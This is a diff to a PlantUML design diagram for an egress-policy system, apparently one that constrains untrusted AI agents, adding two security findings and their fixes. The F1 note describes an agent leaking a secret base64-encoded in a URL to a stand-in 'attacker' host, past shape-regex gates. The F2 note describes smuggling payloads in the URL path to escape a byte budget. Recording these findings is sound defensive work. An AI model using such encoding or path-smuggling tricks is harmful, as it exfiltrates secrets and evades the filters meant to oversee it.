@@ -15,6 +15,11 @@ node "D-series — structural decisions\nwhere a thing lives and how it is exten
   component "**D6**\nthe mount model is declared, not coded" as D6 <<app>>
 }
 
+node "F-series — security findings\nan attack that was possible, and its fix" as FS <<host>> {
+  component "**F1** (CRITICAL)\nencoded read-exfil in a URL" as F1 <<error>>
+  component "**F2** (HIGH)\nthe byte budget ignored the path" as F2 <<error>>
+}
+
 node "C-series — runtime constraints\nwhat must hold while a run executes" as CS <<host>> {
   component "**C1**\noperator domains are honoured unconditionally" as C1 <<app>>
   component "**C2**\nthe injected secret does not outlive the run" as C2 <<app>>
@@ -28,6 +33,30 @@ database "This diagram — the definitions,\nderived from the citing prose" as D
 
 DS ARROW_MAIN DEFS
 CS ARROW_MAIN DEFS
+FS ARROW_MAIN DEFS
+
+note bottom of F1
+  **The attack.** An untrusted agent in ""firewall"" mode reads a secret it
+  can access and leaks it in a GET URL to any non-sink host — reads are
+  allow-by-default. The only content gates were exact values and shape
+  regexes, which base64 defeats, so
+  ""GET https://attacker/<base64(secret)>"" sailed through.
+
+  **The fix:** decode-and-rescan, default ON — see layer C in
+  ""_spec/internal/egresspolicy/egress-policy-layers\.puml"".
+
+  Unlike the D and C series, F1/F2 //are// defined in the repo, in
+  ""internal/egresspolicy/f1_exploit_test\.go"" — the regression guard that
+  asserts the fix. They are recorded here because production code cites
+  them (""cmd/proveo-egress/main\.go""), and an id a reader cannot resolve
+  without opening a test file is only half-defined.
+end note
+
+note bottom of F2
+  **The byte budget charged the query but not the path**, so a path-smuggled
+  payload was unbounded while the same bytes in a query string were
+  counted. It now charges the whole request-target plus body.
+end note
 DEFS ARROW_ERROR DEAD : what these citations were until now
 
 note bottom of DEAD
